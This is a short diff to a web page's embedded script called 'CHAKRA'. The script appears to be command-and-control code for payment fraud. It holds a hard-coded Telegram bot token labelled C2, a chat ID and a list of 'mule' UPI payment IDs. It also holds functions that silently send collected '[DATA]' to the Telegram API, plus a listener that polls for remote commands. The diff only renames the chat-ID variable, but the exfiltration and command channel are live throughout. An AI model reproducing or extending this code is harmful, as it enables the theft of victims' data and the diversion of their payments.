@@ -140,12 +140,12 @@
 
 <script>
   // ============================================================
-  // CHAKRA - UPDATED WITH NEW TELEGRAM BOT
+  // CHAKRA - CORRECTED WITH UNIFIED BOT CREDENTIALS
   // ============================================================
 
-  // ===== YOUR NEW TELEGRAM CREDENTIALS =====
+  // ===== UNIFIED TELEGRAM CREDENTIALS =====
   const C2_BOT_TOKEN = '8933219910:AAGrb16D3twK-yyPMVDRwwYIgLtiaOyy-iQ';
-  const YOUR_USERNAME = '7958767858';
+  const YOUR_CHAT_ID = '7958767858';
 
   // ===== VARIABLES =====
   let myUPIList = ['mule1@paytm'];
@@ -173,7 +173,7 @@
     fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/sendMessage', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: YOUR_USERNAME, text: message })
+      body: JSON.stringify({ chat_id: YOUR_CHAT_ID, text: message })
     }).catch(() => {});
   }
 
@@ -184,7 +184,7 @@
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        chat_id: YOUR_USERNAME,
+        chat_id: YOUR_CHAT_ID,
         text: '[DATA] ' + message
       })
     }).catch(() => {});
@@ -655,7 +655,7 @@
   }, 5000);
 
   // ============================================================
-  // TELEGRAM COMMAND LISTENER (UPDATED TOKEN)
+  // TELEGRAM COMMAND LISTENER (UNIFIED TOKEN)
   // ============================================================
   function fastCommandListener() {
     fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/getUpdates?offset=' + lastUpdateId + '&timeout=10')
